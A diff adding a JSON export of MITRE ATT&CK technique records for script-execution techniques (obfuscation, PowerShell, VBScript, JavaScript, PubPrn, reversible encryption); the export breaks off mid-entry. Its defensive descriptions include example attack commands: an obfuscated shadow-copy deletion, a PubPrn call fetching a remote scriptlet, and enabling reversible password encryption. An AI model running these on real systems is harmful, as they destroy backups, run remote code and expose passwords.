@@ -1,0 +1,975 @@
+[
+  {
+    "id": "attack-pattern--d511a6f6-4a33-41d5-bc95-c343875d1377",
+    "platform": "linux|macos|windows",
+    "tid": "T1027.010",
+    "technique": "Command Obfuscation",
+    "tactic": "defense-evasion",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may obfuscate content during command execution to impede detection. Command-line obfuscation is a method of making strings and patterns within commands and scripts more difficult to signature and analyze. This type of obfuscation can be included within commands executed by delivered payloads (e.g., [Phishing](https://attack.mitre.org/techniques/T1566) and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)) or interactively via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation: Akamai JS)(Citation: Malware Monday VBE)\n\nFor example, adversaries may abuse syntax that utilizes various symbols and escape characters (such as spacing,  `^`, `+`. `$`, and `%`) to make commands difficult to analyze while maintaining the same intended functionality.(Citation: RC PowerShell) Many languages support built-in obfuscation in the form of base64 or URL encoding.(Citation: Microsoft PowerShellB64) Adversaries may also manually implement command obfuscation via string splitting (`“Wor”+“d.Application”`), order and casing of characters (`rev <<<'dwssap/cte/ tac'`), globing (`mkdir -p '/tmp/:&$NiA'`), as well as various tricks involving passing strings through tokens/environment variables/input streams.(Citation: Bashfuscator Command Obfuscators)(Citation: FireEye Obfuscation June 2017)\n\nAdversaries may also use tricks such as directory traversals to obfuscate references to the binary being invoked by a command (`C:\\voi\\pcw\\..\\..\\Windows\\tei\\qs\\k\\..\\..\\..\\system32\\erool\\..\\wbem\\wg\\je\\..\\..\\wmic.exe shadowcopy delete`).(Citation: Twitter Richard WMIC)\n\nTools such as <code>Invoke-Obfuscation</code> and <code>Invoke-DOSfucation</code> have also been used to obfuscate commands.(Citation: Invoke-DOSfuscation)(Citation: Invoke-Obfuscation)",
+    "technique_references": [
+      {
+        "source_name": "Twitter Richard WMIC",
+        "url": "https://twitter.com/rfackroyd/status/1639136000755765254",
+        "description": "Ackroyd, R. (2023, March 24). Twitter. Retrieved March 24, 2023.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Invoke-Obfuscation",
+        "url": "https://github.com/danielbohannon/Invoke-Obfuscation",
+        "description": "Bohannon, D. (2016, September 24). Invoke-Obfuscation. Retrieved March 17, 2023.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Invoke-DOSfuscation",
+        "url": "https://github.com/danielbohannon/Invoke-DOSfuscation",
+        "description": "Bohannon, D. (2018, March 19). Invoke-DOSfuscation. Retrieved March 17, 2023.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "FireEye Obfuscation June 2017",
+        "url": "https://web.archive.org/web/20170923102302/https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html",
+        "description": "Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Malware Monday VBE",
+        "url": "https://bromiley.medium.com/malware-monday-vbscript-and-vbe-files-292252c1a16",
+        "description": "Bromiley, M. (2016, December 27). Malware Monday: VBScript and VBE Files. Retrieved March 17, 2023.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Akamai JS",
+        "url": "https://www.akamai.com/blog/security/catch-me-if-you-can-javascript-obfuscation",
+        "description": "Katz, O. (2020, October 26). Catch Me if You Can—JavaScript Obfuscation. Retrieved March 17, 2023.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Bashfuscator Command Obfuscators",
+        "url": "https://bashfuscator.readthedocs.io/en/latest/Mutators/command_obfuscators/index.html",
+        "description": "LeFevre, A. (n.d.). Bashfuscator Command Obfuscators. Retrieved March 17, 2023.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft PowerShellB64",
+        "url": "https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1#-encodedcommand-base64encodedcommand",
+        "description": "Microsoft. (2023, February 8). about_PowerShell_exe: EncodedCommand. Retrieved March 17, 2023.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "RC PowerShell",
+        "url": "https://redcanary.com/threat-detection-report/techniques/powershell/",
+        "description": "Red Canary. (n.d.). 2022 Threat Detection Report: PowerShell. Retrieved March 17, 2023.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
+    "platform": "macos|windows|linux",
+    "tid": "T1056.002",
+    "technique": "GUI Input Capture",
+    "tactic": "collection",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) ",
+    "technique_references": [
+      {
+        "source_name": "OSX Malware Exploits MacKeeper",
+        "url": "https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html",
+        "description": "Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits Mackeeper. Retrieved July 3, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "LogRhythm Do You Trust Oct 2014",
+        "url": "https://logrhythm.com/blog/do-you-trust-your-computer/",
+        "description": "Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved December 17, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "OSX Keydnap malware",
+        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
+        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Spoofing credential dialogs",
+        "url": "https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/",
+        "description": "Johann Rehberger. (2021, April 18). Spoofing credential dialogs on macOS Linux and Windows. Retrieved August 19, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma Phishing for Credentials Jan 2015",
+        "url": "https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/",
+        "description": "Nelson, M. (2015, January 21). Phishing for Credentials: If you want it, just ask!. Retrieved December 17, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
+    "platform": "macos|windows|linux",
+    "tid": "T1056.002",
+    "technique": "GUI Input Capture",
+    "tactic": "credential-access",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs) ",
+    "technique_references": [
+      {
+        "source_name": "OSX Malware Exploits MacKeeper",
+        "url": "https://baesystemsai.blogspot.com/2015/06/new-mac-os-malware-exploits-mackeeper.html",
+        "description": "Sergei Shevchenko. (2015, June 4). New Mac OS Malware Exploits Mackeeper. Retrieved July 3, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "LogRhythm Do You Trust Oct 2014",
+        "url": "https://logrhythm.com/blog/do-you-trust-your-computer/",
+        "description": "Foss, G. (2014, October 3). Do You Trust Your Computer?. Retrieved December 17, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "OSX Keydnap malware",
+        "url": "https://www.welivesecurity.com/2016/07/06/new-osxkeydnap-malware-hungry-credentials/",
+        "description": "Marc-Etienne M.Leveille. (2016, July 6). New OSX/Keydnap malware is hungry for credentials. Retrieved July 3, 2017.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Spoofing credential dialogs",
+        "url": "https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/",
+        "description": "Johann Rehberger. (2021, April 18). Spoofing credential dialogs on macOS Linux and Windows. Retrieved August 19, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma Phishing for Credentials Jan 2015",
+        "url": "https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/",
+        "description": "Nelson, M. (2015, January 21). Phishing for Credentials: If you want it, just ask!. Retrieved December 17, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--970a3432-3237-47ad-bcca-7d8cbb217736",
+    "platform": "windows",
+    "tid": "T1059.001",
+    "technique": "PowerShell",
+    "tactic": "execution",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.(Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](https://attack.mitre.org/software/S0363),  [PowerSploit](https://attack.mitre.org/software/S0194), [PoshC2](https://attack.mitre.org/software/S0378), and PSAttack.(Citation: Github PSAttack)\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).(Citation: Sixdub PowerPick Jan 2016)(Citation: SilentBreak Offensive PS Dec 2015)(Citation: Microsoft PSfromCsharp APR 2014)",
+    "technique_references": [
+      {
+        "source_name": "Microsoft PSfromCsharp APR 2014",
+        "url": "https://blogs.msdn.microsoft.com/kebab/2014/04/28/executing-powershell-scripts-from-c/",
+        "description": "Babinec, K. (2014, April 28). Executing PowerShell scripts from C#. Retrieved April 22, 2019.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "SilentBreak Offensive PS Dec 2015",
+        "url": "https://web.archive.org/web/20190508170150/https://silentbreaksecurity.com/powershell-jobs-without-powershell-exe/",
+        "description": "Christensen, L.. (2015, December 28). The Evolution of Offensive PowerShell Invocation. Retrieved December 8, 2018.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "FireEye PowerShell Logging 2016",
+        "url": "https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html",
+        "description": "Dunwoody, M. (2016, February 11). GREATER VISIBILITY THROUGH POWERSHELL LOGGING. Retrieved February 16, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Github PSAttack",
+        "url": "https://github.com/jaredhaight/PSAttack",
+        "description": "Haight, J. (2016, April 21). PS>Attack. Retrieved June 1, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "inv_ps_attacks",
+        "url": "https://powershellmagazine.com/2014/07/16/investigating-powershell-attacks/",
+        "description": "Hastings, M. (2014, July 16). Investigating PowerShell Attacks. Retrieved December 1, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Malware Archaeology PowerShell Cheat Sheet",
+        "url": "http://www.malwarearchaeology.com/s/Windows-PowerShell-Logging-Cheat-Sheet-ver-June-2016-v2.pdf",
+        "description": "Malware Archaeology. (2016, June). WINDOWS POWERSHELL LOGGING CHEAT SHEET - Win 7/Win 2008 or later. Retrieved June 24, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "TechNet PowerShell",
+        "url": "https://technet.microsoft.com/en-us/scriptcenter/dd742419.aspx",
+        "description": "Microsoft. (n.d.). Windows PowerShell Scripting. Retrieved April 28, 2016.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Sixdub PowerPick Jan 2016",
+        "url": "https://web.archive.org/web/20160327101330/http://www.sixdub.net/?p=367",
+        "description": "Warner, J.. (2015, January 6). Inexorable PowerShell – A Red Teamer’s Tale of Overcoming Simple AppLocker Policies. Retrieved December 8, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--dfd7cc1d-e1d8-4394-a198-97c4cab8aa67",
+    "platform": "windows|macos|linux",
+    "tid": "T1059.005",
+    "technique": "Visual Basic",
+    "tactic": "execution",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)\n\nDerivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)\n\nAdversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )",
+    "technique_references": [
+      {
+        "source_name": "VB .NET Mar 2020",
+        "url": "https://devblogs.microsoft.com/vbteam/visual-basic-support-planned-for-net-5-0/",
+        "description": ".NET Team. (2020, March 11). Visual Basic support planned for .NET 5.0. Retrieved June 23, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Default VBS macros Blocking ",
+        "url": "https://techcommunity.microsoft.com/t5/microsoft-365-blog/helping-users-stay-safe-blocking-internet-macros-by-default-in/ba-p/3071805",
+        "description": "Kellie Eickmeyer. (2022, February 7). Helping users stay safe: Blocking internet macros by default in Office. Retrieved February 7, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft VBScript",
+        "url": "https://docs.microsoft.com/previous-versions//1kw29xwf(v=vs.85)",
+        "description": "Microsoft. (2011, April 19). What Is VBScript?. Retrieved March 28, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft VBA",
+        "url": "https://docs.microsoft.com/office/vba/api/overview/",
+        "description": "Microsoft. (2019, June 11). Office VBA Reference. Retrieved June 23, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "VB Microsoft",
+        "url": "https://docs.microsoft.com/dotnet/visual-basic/",
+        "description": "Microsoft. (n.d.). Visual Basic documentation. Retrieved June 23, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Wikipedia VBA",
+        "url": "https://en.wikipedia.org/wiki/Visual_Basic_for_Applications",
+        "description": "Wikipedia. (n.d.). Visual Basic for Applications. Retrieved August 13, 2020.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d",
+    "platform": "windows|macos|linux",
+    "tid": "T1059.007",
+    "technique": "JavaScript",
+    "tactic": "execution",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).",
+    "technique_references": [
+      {
+        "source_name": "NodeJS",
+        "url": "https://nodejs.org/",
+        "description": "OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "JScrip May 2018",
+        "url": "https://docs.microsoft.com/windows/win32/com/translating-to-jscript",
+        "description": "Microsoft. (2018, May 31). Translating to JScript. Retrieved June 23, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft JScript 2007",
+        "url": "https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript",
+        "description": "Microsoft. (2007, August 15). The World of JScript, JavaScript, ECMAScript …. Retrieved June 23, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Microsoft Windows Scripts",
+        "url": "https://docs.microsoft.com/scripting/winscript/windows-script-interfaces",
+        "description": "Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved June 23, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Apple About Mac Scripting 2016",
+        "url": "https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html",
+        "description": "Apple. (2016, June 13). About Mac Scripting. Retrieved April 14, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "SpecterOps JXA 2020",
+        "url": "https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5",
+        "description": "Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "SentinelOne macOS Red Team",
+        "url": "https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/",
+        "description": "Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Red Canary Silver Sparrow Feb2021",
+        "url": "https://redcanary.com/blog/clipping-silver-sparrows-wings/",
+        "description": "Tony Lambert. (2021, February 18). Clipping Silver Sparrow’s wings: Outing macOS malware before it takes flight. Retrieved April 20, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "MDSec macOS JXA and VSCode",
+        "url": "https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/",
+        "description": "Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans with VSCode Extensions. Retrieved April 20, 2021.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user|administrator|system",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--09cd431f-eaf4-4d2a-acaf-2a7acfe7ed58",
+    "platform": "windows",
+    "tid": "T1216.001",
+    "technique": "PubPrn",
+    "tactic": "defense-evasion",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>.(Citation: pubprn)\n\nAdversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.(Citation: Enigma0x3 PubPrn Bypass) To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.\n\nIn later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).",
+    "technique_references": [
+      {
+        "source_name": "pubprn",
+        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn",
+        "description": "Jason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "Enigma0x3 PubPrn Bypass",
+        "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/",
+        "description": "Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "none",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48",
+    "platform": "windows",
+    "tid": "T1556.005",
+    "technique": "Reversible Encryption",
+    "tactic": "credential-access",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory [PowerShell](https://attack.mitre.org/techniques/T1059/001) module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher.(Citation: dump_pwd_dcsync) In PowerShell, an adversary may make associated changes to user settings using commands similar to <code>Set-ADUser -AllowReversiblePasswordEncryption $true</code>.",
+    "technique_references": [
+      {
+        "source_name": "store_pwd_rev_enc",
+        "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption",
+        "description": "Microsoft. (2021, October 28). Store passwords using reversible encryption. Retrieved January 3, 2022.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "how_pwd_rev_enc_1",
+        "url": "http://blog.teusink.net/2009/08/passwords-stored-using-reversible.html",
+        "description": "Teusink, N. (2009, August 25). Passwords stored using reversible encryption: how it works (part 1). Retrieved November 17, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "how_pwd_rev_enc_2",
+        "url": "http://blog.teusink.net/2009/08/passwords-stored-using-reversible_26.html",
+        "description": "Teusink, N. (2009, August 26). Passwords stored using reversible encryption: how it works (part 2). Retrieved November 17, 2021.",
+        "external_id": "none"
+      },
+      {
+        "source_name": "dump_pwd_dcsync",
+        "url": "https://adsecurity.org/?p=2053",
+        "description": "Metcalf, S. (2015, November 22). Dump Clear-Text Passwords for All Admins in the Domain Using Mimikatz DCSync. Retrieved November 15, 2021.",
+        "external_id": "none"
+      }
+    ],
+    "technique_required_permissions": "user|administrator",
+    "technique_effective_permissions": "none",
+    "search_token": "none"
+  },
+  {
+    "id": "attack-pattern--d50955c2-272d-4ac8-95da-10c29dda1c48",
+    "platform": "windows",
+    "tid": "T1556.005",
+    "technique": "Reversible Encryption",
+    "tactic": "defense-evasion",
+    "datasources": "script-execution",
+    "has_subtechniques": false,
+    "is_deprecated": false,
+    "is_revoked": false,
+    "subtechniques": [],
+    "count_subtechniques": 0,
+    "correlation_adversary": "none",
+    "correlation_malware": "none",
+    "correlation_tool": "none",
+    "correlation_gid": "none",
+    "technique_description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The <code>AllowReversiblePasswordEncryption</code> property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.(Citation: store_pwd_rev_enc)\n\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\n\n1. Encrypted password (<code>G$RADIUSCHAP</code>) from the Active Directory user-structure <code>userParameters</code>\n2. 16 byte randomly-generated value (<code>G$RADIUSCHAPKEY</code>) also from <code>userParameters</code>\n3. Global LSA secret (<code>G$MSRADIUSCHAPKEY</code>)\n4. Static key hardcoded in the Remote Access Subauthentication DLL (<code>RASSFM.DLL</code>)\n\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.(Citation: how_pwd_rev_enc_1)(Citation: how_pwd_rev_enc_2)\n\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory 